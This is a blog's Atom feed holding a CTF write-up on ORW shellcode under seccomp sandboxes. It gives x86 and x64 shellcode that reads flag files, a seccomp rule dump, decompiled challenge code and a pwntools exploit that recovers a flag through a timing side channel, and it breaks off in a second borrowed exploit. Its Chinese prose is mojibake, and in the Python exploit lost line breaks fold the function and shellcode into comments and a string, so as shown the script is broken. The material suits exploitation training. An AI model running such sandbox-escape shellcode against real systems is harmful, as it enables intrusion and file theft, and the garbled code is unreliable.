<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kyä¸æ˜¯æ•æœ¨</title>
  
  <subtitle>åˆ†äº«å­¦ä¹ ç»éªŒ</subtitle>
  <link href="https://kylinxin.github.io/atom.xml" rel="self"/>
  
  <link href="https://kylinxin.github.io/"/>
  <updated>2023-11-26T07:11:28.601Z</updated>
  <id>https://kylinxin.github.io/</id>
  
  <author>
    <name>Kylinxin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ORW</title>
    <link href="https://kylinxin.github.io/2023/11/26/ORW%20%E9%A2%98%E5%9E%8B/"/>
    <id>https://kylinxin.github.io/2023/11/26/ORW%20%E9%A2%98%E5%9E%8B/</id>
    <published>2023-11-26T15:14:29.000Z</published>
    <updated>2023-11-26T07:11:28.601Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å¤ç°å¼ºç½‘æ¯2021èµ›é¢˜[shellcode]æœ‰æ„Ÿï¼Œç‰¹æ„æ¥å­¦ä¹ ä¸€ä¸‹æœ‰å…³orwåŸç†ä¸­ç¼ºå°‘æŸäº›å‡½æ•°çš„æƒ…å†µå¦‚ä½•è¿›è¡ŒORW<br>ç¦ç”¨æ²™ç®±è§„åˆ™æˆ‘åœ¨ä¹‹å‰æåˆ°è¿‡ [[prctl-seccomp]]<br>å‚è€ƒäº†å¤§ä½¬!<a href="https://www.jianshu.com/p/754b0a2ae353">https://www.jianshu.com/p/754b0a2ae353</a></p><h3 id="æ™®é€š-ORW"><a href="#æ™®é€š-ORW" class="headerlink" title="æ™®é€š ORW"></a>æ™®é€š ORW</h3><ol><li><p>32 ä½</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">; "/home/orw/flag\x00" ä¿å­˜åˆ°æ ˆä¸Š<br>  ; å°ç«¯åº<br>  ; è¦æ³¨æ„ç»™å­—ç¬¦ä¸²ç»“å°¾åŠ ä¸Š '\x00'<br>  push   0x006761<br>  push   0x6c662f77<br>  push   0x726f2f65<br>  push   0x6d6f682f<br>  ; open("/home/orw/flag", O_RDONLY)<br>  ; #define O_RDONLY 0 <br>  mov eax,5       ; open() ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 5<br>  mov ebx,esp ; "/home/orw/flag"<br>  xor ecx,ecx     ; O_RDONLY = 0<br>  xor edx,edx<br>  int 0x80        ; int 80h ä¼šæŠ¥é”™<br>  ; è¿”å› fd ä¿å­˜åˆ° eax ä¸­<br><br>  ; read(fd, buf, count)<br>  mov ebx,eax     ; fd<br>  mov eax,3       ; read() çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 3<br>  mov ecx,esp     ; buf<br>  mov edx,0x30    ; count<br>  int 0x80<br><br>  ; write(fd, buf, count)<br>  mov eax,4       ; write() çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ 4<br>  mov ebx,1       ; fd=1, writeåˆ°æ ‡å‡†è¾“å‡º<br>  mov ecx,esp     ; buf<br>  mov edx,0x30    ; count<br>  int 0x80<br></code></pre></td></tr></tbody></table></figure></li><li><p>64 ä½<br> (1). ç‰ˆæœ¬ä¸€</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asm">; open("flag", 0)<br>   0:   68 66 6c 61 67          push   0x67616c66<br>   5:   6a 02                   push   0x2<br>   7:   58                      pop    rax<br>   8:   48 89 e7                mov    rdi,rsp<br>   b:   48 31 f6                xor    rsi,rsi<br>   e:   0f 05                   syscall <br><br>   ; read(fd, rsp, 0x20)<br>  10:   48 89 c7                mov    rdi,rax<br>  13:   48 31 c0                xor    rax,rax<br>  16:   48 89 e6                mov    rsi,rsp<br>  19:   6a 20                   push   0x20<br>  1b:   5a                      pop    rdx<br>  1c:   0f 05                   syscall <br><br>   ; write(1, rsp, 0x20)<br>  1e:   6a 01                   push   0x1<br>  20:   58                      pop    rax<br>  21:   6a 01                   push   0x1<br>  23:   5f                      pop    rdi<br>  24:   48 89 e6                mov    rsi,rsp<br>  27:   6a 20                   push   0x20<br>  29:   5a                      pop    rdx<br>  2a:   0f 05                   syscall<br></code></pre></td></tr></tbody></table></figure></li></ol><p>(2). ç‰ˆæœ¬äºŒ</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">/* push b'flag\x00' */<br>push 0x67616c66<br>/* call open('rsp', 0, 'O_RDONLY') */<br>push (2) /* 2 */<br>pop rax<br>mov rdi, rsp<br>xor esi, esi /* 0 */<br>cdq /* rdx=0 */<br>syscall<br>/* call sendfile(1, 'rax', 0, 2147483647) */<br>mov r10d, 0x7fffffff<br>mov rsi, rax<br>push (40) /* 0x28 */<br>pop rax<br>push 1<br>pop rdi<br>cdq /* rdx=0 */<br>syscall<br></code></pre></td></tr></tbody></table></figure><h3 id="OR-ç¼º-W-ä¾‹é¢˜-2021-è“å¸½æ¯åˆèµ›-slient"><a href="#OR-ç¼º-W-ä¾‹é¢˜-2021-è“å¸½æ¯åˆèµ›-slient" class="headerlink" title="OR ç¼º W (ä¾‹é¢˜: 2021-è“å¸½æ¯åˆèµ›-slient)"></a>OR ç¼º W (ä¾‹é¢˜: 2021-è“å¸½æ¯åˆèµ›-slient)</h3><ol><li>æ–‡ä»¶</li></ol><blockquote><p>é“¾æ¥ï¼š<a href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA">https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA</a><br>æå–ç ï¼ša6gt</p></blockquote><p>é¢˜ç›®ä¿æŠ¤å¦‚ä¸‹</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">â”Œâ”€â”€(kylinxinğŸš€LAPTOP-O0CAV6MM)-[/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w]<br>â””â”€âœ¨ checksec chall<br>[*] <span class="hljs-string">'/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w/chall'</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure><p>æ²™ç®±ä¿æŠ¤å¼€å¯å¦‚ä¸‹ï¼Œåªèƒ½å…è®¸readï¼Œopenï¼Œç¦ç”¨äº†writeï¼Œé‚£ä¹ˆæ„å‘³ç€æˆ‘ä»¬ORWç»„åˆæŠ€åªæœ‰ORå¯ä»¥ä½¿ç”¨</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">Welcome to silent execution-box.<br><br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></tbody></table></figure><p>é€†å‘ä»£ç åˆ†æ</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">  ......<br><span class="hljs-comment">// é€†å‘ä»£ç ç‰‡æ®µ</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to silent execution-box."</span>);<br><br>  v3 = getpagesize();<br>  <span class="hljs-comment">// åˆ©ç”¨ mmap å‡½æ•°åœ¨ 0x10000 å¤„å¼€è¾Ÿä¸€ä¸ª page çš„ç©ºé—´</span><br>  v9 = (<span class="hljs-type">int</span>)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1000</span>, v3, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br><br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);<br><br>  <span class="hljs-comment">// è®¾ç½®æ²™ç›’</span><br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  prctl(<span class="hljs-number">4</span>, <span class="hljs-number">0LL</span>);<br>  v8 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_load(v8);<br><br>  <span class="hljs-comment">// å¾€ &amp;buf ä¸­è¯»å…¥ 0x40 å­—èŠ‚æ•°æ®</span><br>  <span class="hljs-comment">// ç„¶åæ‰§è¡Œè¿™æ®µæ•°æ®</span><br>  v4 = buf;<br>  ......<br>  *(_OWORD *)v9 = v4;<br>  ((<span class="hljs-type">void</span> (__fastcall *)(__int64, __int64, __int64))v9)(<span class="hljs-number">0xDEADBEEF</span>LL, <span class="hljs-number">0xDEADBEEF</span>LL, <span class="hljs-number">0xDEADBEEF</span>LL);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// about mmap (link: https://man7.org/linux/man-pages/man2/mmap.2.html)</span><br><span class="hljs-comment">// 1. SYNOPSIS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><br><span class="hljs-comment">/* 2. DESCRIPTION</span><br><span class="hljs-comment"> mmap() creates a new mapping in the virtual address space of the</span><br><span class="hljs-comment">       calling process.  The starting address for the new mapping is</span><br><span class="hljs-comment">       specified in addr.  The length argument specifies the length of</span><br><span class="hljs-comment">       the mapping (which must be greater than 0).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       If addr is NULL, then the kernel chooses the (page-aligned)</span><br><span class="hljs-comment">       address at which to create the mapping; this is the most portable</span><br><span class="hljs-comment">       method of creating a new mapping.  If addr is not NULL, then the</span><br><span class="hljs-comment">       kernel takes it as a hint about where to place the mapping; on</span><br><span class="hljs-comment">       Linux, the kernel will pick a nearby page boundary (but always</span><br><span class="hljs-comment">       above or equal to the value specified by</span><br><span class="hljs-comment">       /proc/sys/vm/mmap_min_addr) and attempt to create the mapping</span><br><span class="hljs-comment">       there.  If another mapping already exists there, the kernel picks</span><br><span class="hljs-comment">       a new address that may or may not depend on the hint.  The</span><br><span class="hljs-comment">       address of the new mapping is returned as the result of the call.</span><br><span class="hljs-comment">......</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></tbody></table></figure><p>ç”± <code>on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr)</code> å¯çŸ¥ï¼šLinux ä¸º <code>mmap</code> åˆ†é…è™šæ‹Ÿå†…å­˜æ—¶ï¼Œæ€»æ˜¯ä»æœ€æ¥è¿‘ <code>addr</code> çš„é¡µè¾¹ç¼˜å¼€å§‹çš„ï¼Œè€Œä¸”ä¿è¯åœ°å€ä¸ä½äº <code>/proc/sys/vm/mmap_min_addr</code> æ‰€æŒ‡å®šçš„å€¼ã€‚<br>å¯ä»¥çœ‹åˆ°ï¼Œ<code>mmap_min_addr = 65536 = 0x10000</code>ï¼Œå› æ­¤åˆšæ‰åˆ¤æ–­ç¨‹åºåˆ©ç”¨ mmap å‡½æ•°åœ¨ 0x10000 å¤„å¼€è¾Ÿä¸€ä¸ª page çš„ç©ºé—´ã€‚</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">â”Œâ”€â”€(kylinxinğŸš€LAPTOP-O0CAV6MM)-[<span class="hljs-regexp">/mnt/</span>e<span class="hljs-regexp">/CTF/</span>PWN<span class="hljs-regexp">/study_path/</span>stackOverflow<span class="hljs-regexp">/orw/</span>orw_no_w]<br>â””â”€âœ¨ cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/vm/mm</span>ap_min_addr<br><span class="hljs-number">65536</span><br></code></pre></td></tr></tbody></table></figure><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><pre><code>æ—¢ç„¶ä¸èƒ½ `write`ï¼Œä¾¿åªèƒ½ç”¨ `open` å‡½æ•°æ‰“å¼€ flag æ–‡ä»¶åå°†å…¶ä¸­ä¿å­˜çš„ flag ç”¨ `read` å‡½æ•°è¯»å–å‡ºæ¥ï¼Œå†é€å­—èŠ‚éå†ï¼Œä¸æ‰€æœ‰çš„æ‰“å°å­—ç¬¦ç”¨ `cmp` è¿›è¡Œæ¯”è¾ƒï¼Œä¸€ä¸ªä¸€ä¸ªå­—èŠ‚åœ°çˆ†ç ´å‡ºæ¥ã€‚è¯¦è§ EXPã€‚</code></pre><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-  </span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">import</span> time  <br>  <br>context(arch=<span class="hljs-string">"amd64"</span>, os=<span class="hljs-string">"linux"</span>)  <span class="hljs-comment"># , log_level = "debug")  </span><br>  <br>  <br><span class="hljs-comment"># åˆ¤æ–­ç¬¬ index ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯ chdef pwn(p, index, ch):  </span><br>    <span class="hljs-comment"># è¿è¡Œæ—¶éœ€è¦å»æ‰ shellcode ä¸­çš„æ³¨é‡Š  </span><br>    <span class="hljs-comment"># ; open(0x10039, 0)  </span><br>    <span class="hljs-comment"># ; 0x10039 è¿™ä¸ªåœ°å€å­˜æ”¾æ–‡ä»¶å  </span><br>    <span class="hljs-comment"># ; fd å­˜æ”¾åœ¨ rax    shellcode = """  </span><br>    push <span class="hljs-number">0x10039</span>    pop rdi    xor esi, esi    push <span class="hljs-number">2</span>    pop rax    syscall  <br>    mov rdi, rax    xor eax, eax    push <span class="hljs-number">0x50</span>    pop rdx    push <span class="hljs-number">0x10040</span>    pop rsi    syscall  <br>    loop:    cmp byte ptr[rsi+{<span class="hljs-number">0</span>}], {<span class="hljs-number">1</span>}    jz loop    ret    <span class="hljs-string">""".format(index, ch)  </span><br><span class="hljs-string">    #     ; æ­¤æ—¶ rsi å­˜æ”¾çš„å³ä¸ºä¿å­˜ flag çš„åœ°å€  </span><br><span class="hljs-string">    #     ; æ£€æŸ¥ flag[index] æ˜¯å¦ç­‰äº ch    #     ; è‹¥ç›¸ç­‰ä¾¿å¡åœ¨è¿™ä¸ªå¾ªç¯é‡Œé¢  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    # åœ¨è¿™é‡Œå†™å…¥æ–‡ä»¶å  </span><br><span class="hljs-string">    payload = asm(shellcode).ljust(0x40 - 7, 'a') + './flag\x00'  </span><br><span class="hljs-string">    p.sendafter("Welcome to silent execution-box.\n", payload)  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">flag = ""  </span><br><span class="hljs-string">index = 0  </span><br><span class="hljs-string">last = 'a'  </span><br><span class="hljs-string">while True:  </span><br><span class="hljs-string">    # é€å­—ç¬¦çˆ†ç ´  </span><br><span class="hljs-string">    update = False  </span><br><span class="hljs-string">    # å¯¹äºæ¯ä¸ªå­—ç¬¦ï¼Œéå†æ‰€æœ‰æ‰“å°å­—ç¬¦ (ascii ç ä» 32 åˆ° 127)    for ch in range(32, 127):  </span><br><span class="hljs-string">        sh = process("./chall")  </span><br><span class="hljs-string">        # è¿œç¨‹æ¯”è¾ƒå®¹æ˜“æ–­ï¼Œå¯ä»¥å¤šæ¬¡è¿æ¥  </span><br><span class="hljs-string">        '''  </span><br><span class="hljs-string">        for i in range(10):            try:                sh = remote("1.1.1.1", "11111")                break            except:                sleep(3)                continue        '''        pwn(sh, index, ch)  </span><br><span class="hljs-string">        start = time.time()  </span><br><span class="hljs-string">        try:  </span><br><span class="hljs-string">            sh.recv(timeout=2)  </span><br><span class="hljs-string">        except:  </span><br><span class="hljs-string">            pass  </span><br><span class="hljs-string">        end = time.time()  </span><br><span class="hljs-string">        sh.close()  </span><br><span class="hljs-string">        # æµ‹è¯•æ¥æ”¶æ—¶å»¶ï¼Œè¶…è¿‡ä¸€å®šæ—¶é™åˆ™è¯´æ˜åœ¨ pwn() å‡½æ•°ä¸­æ’å…¥ shellcode åå¡å¾ªç¯äº†ï¼Œå³ flag ä¸­çš„ç¬¬ index ä¸ªå­—ç¬¦æ˜¯ ch        if (end - start &gt; 1.5):  </span><br><span class="hljs-string">            flag += chr(ch)  </span><br><span class="hljs-string">            last = chr(ch)  </span><br><span class="hljs-string">            update = True  </span><br><span class="hljs-string">            print("[ flag + 1 !!! ] " + flag)  </span><br><span class="hljs-string">            break  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    assert (update == True)  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    if (last == '}'):  </span><br><span class="hljs-string">        break  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    index += 1  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">print("flag: " + flag)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="RW-ç¼º-O"><a href="#RW-ç¼º-O" class="headerlink" title="RW ç¼º O"></a>RW ç¼º O</h3><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://links.jianshu.com/go?to=https://xz.aliyun.com/t/6645">shellcode çš„è‰ºæœ¯</a><br>è¯¦æƒ…è¯·çœ‹æ–‡ç« ä¸­çš„ â€œå…­ã€ç¦ç”¨äº†systemå’Œopenï¼Œè¿˜é™åˆ¶äº†shellcodeå­—ç¬¦â€ï¼Œé‡Œé¢ç”¨ ex å¸ˆå‚…çš„ä¸€é“é¢˜ç›®ä¸ºä¾‹ã€‚<br>åœ¨ ex å¸ˆå‚…çš„è¿™é“é¢˜ä¸­ï¼Œç¨‹åºæ˜¯ 64 ä½çš„ï¼Œç¦ç”¨äº† <code>open</code> å‡½æ•°ï¼Œä½†æ˜¯å…è®¸è°ƒç”¨ <code>fstat</code> å‡½æ•°ï¼ˆè¯¥å‡½æ•°çš„ 64 ä½ç³»ç»Ÿè°ƒç”¨å·ä¸º 5ï¼Œè¿™ä¸ªæ˜¯ <code>open</code> å‡½æ•°çš„ 32 ä½ç³»ç»Ÿè°ƒç”¨å·ï¼‰ã€‚å› æ­¤ï¼Œè¿™é“é¢˜çš„åŸºæœ¬æ€è·¯å°±æ˜¯åˆ©ç”¨ <code>retfq</code> æ±‡ç¼–æŒ‡ä»¤è¿›è¡Œ 32 ä½å’Œ 64 ä½ç³»ç»Ÿæ ¼å¼ä¹‹é—´çš„åˆ‡æ¢ï¼Œåœ¨ 32 ä½æ ¼å¼ä¸‹æ‰§è¡Œ <code>open</code> å‡½æ•°æ‰“å¼€ <code>flag</code> æ–‡ä»¶ï¼Œåœ¨ 64 ä½æ ¼å¼ä¸‹æ‰§è¡Œè¾“å…¥è¾“å‡ºã€‚<br>è€Œä¸”ï¼Œç”±äºè¿™é“é¢˜é™åˆ¶è¾“å…¥çš„ shellcode å¿…é¡»æ˜¯å¯æ‰“å°å­—ç¬¦ï¼Œåœ¨å†™ shellcode çš„æ—¶å€™è¿˜éœ€è¦ä½¿ç”¨ä¸€äº›æŠ€å·§ï¼ŒåŸºæœ¬æ€è·¯å°±æ˜¯ï¼šå¯¹äºä¸€äº›ï¼ˆå¯¹åº”çš„å­—èŠ‚ç æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼‰çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œåˆ©ç”¨å¯æ‰“å°å­—ç¬¦ä¹‹é—´çš„ç®—æœ¯æ“ä½œï¼ˆä¸»è¦æ˜¯å¼‚æˆ–ï¼‰æ¥è·å–ã€‚å…·ä½“å¯ä»¥å‚è€ƒæ–‡ç« ä¸­çš„ â€œä¸‰ã€é™åˆ¶å­—ç¬¦â€ã€‚<br>ä¸‹é¢æ˜¯æ–‡ç« ä¸­çš„ä»£ç ï¼Œè‡ªå·±åŠ äº†ä¸€ç‚¹æ³¨é‡Šï¼š</p>  <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 